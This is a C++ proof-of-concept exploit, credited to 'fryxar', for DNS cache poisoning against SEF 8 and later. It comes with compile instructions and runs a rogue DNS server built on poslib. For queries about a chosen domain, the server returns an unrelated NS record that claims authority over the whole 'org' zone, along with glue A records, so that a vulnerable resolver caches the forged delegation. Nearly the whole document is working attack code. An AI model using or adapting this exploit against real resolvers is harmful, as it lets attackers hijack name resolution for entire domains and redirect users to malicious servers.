// PoC poisoning cache attack SEF 8 and later (by fryxar)
// Requires poslib 1.0.4 library
// Compile: g++ `poslib-config --libs --cflags --server` poc.cpp -o poc

#define POS_DEFAULTLOG
#define POS_DEFAULTLOG_STDERR
#define POS_DEFAULTLOG_SYSLOG

// Server include file
#include <poslib/server/server.h>

// For signal handling
#include <stdlib.h>
#include <signal.h>

char *dyndomain;

DnsMessage *my_handle_query(pending_query *query);

void cleanup(int sig) {
 // close down the server system
 pos_setquitflag();
}

int main(int argc, char **argv) {
_addr a;

 try {
   /* get command-line arguments */
   if (argc != 2 ) {
     printf( "Usage: %s [domainname]\n", argv[0] );
     return 1;
   } else {
     dyndomain = argv[1];
     txt_to_addr(&a, "any");
   }

   poslib_config_init();

   /* bring up posadis */
   servers.push_front(ServerSocket(ss_udp, udpcreateserver(&a)));

   // use the posadis logging system
   pos_log(context_none, log_info, "Proof of concept DNS server starting up...");

   // set signal handlers
   signal(SIGINT, cleanup);
   signal(SIGTERM, cleanup);

   // set query function
   handle_query = my_handle_query;

   // run server
   posserver_run();
 } catch (PException p) {
   printf("Fatal exception: %s\n", p.message);
   return 1;
 }

 return 0;
}

/* the entry function which will handle all queries */
DnsMessage *my_handle_query(pending_query *query) {
 DnsMessage *a = new DnsMessage();
 DnsQuestion q;
 DnsRR rr;

 /* set a as an answer to the query */
 a->ID = query->message->ID;
 a->RD = query->message->RD;
 a->RA = false;

 if (query->message->questions.begin() == query->message->questions.end()) {
   /* query did not contain question */
   a->RCODE = RCODE_QUERYERR;
   return a;
 }
 q = *query->message->questions.begin();
 a->questions.push_back(q);
 a->QR = true;

 pos_log(context_server, log_info, "Query: [%s,%s]", q.QNAME.tocstr(), str_qtype(q.QTYPE).c_str());

 if (q.QTYPE == DNS_TYPE_A && q.QNAME == dyndomain) {
   rr = DnsRR(dyndomain, DNS_TYPE_A, CLASS_IN, 3600);
   string data = rr_fromstring(DNS_TYPE_A, "200.200.200.200"); // Anything...
   rr.RDLENGTH = data.size();
   rr.RDATA = (char *)memdup(data.c_str(), data.size());
   a->answers.push_back(rr);

   rr = DnsRR("org", DNS_TYPE_NS, CLASS_IN, 3600);
   data = rr_fromstring(DNS_TYPE_NS, "fakedns.com");
   rr.RDLENGTH = data.size();
   rr.RDATA = (char *)memdup(data.c_str(), data.size());
   a->authority.push_back(rr);

   rr = DnsRR("fakedns.com", DNS_TYPE_A, CLASS_IN, 3600);
   data = rr_fromstring(DNS_TYPE_A, "200.200.200.201"); // Anything...
   rr.RDLENGTH = data.size();
   rr.RDATA = (char *)memdup(data.c_str(), data.size());
   a->additional.push_back(rr);
 } else {
   /* we don't want this */
   a->RCODE = RCODE_SRVFAIL;
 }
 return a;
}
#########################################################
# End poc.cpp
#########################################################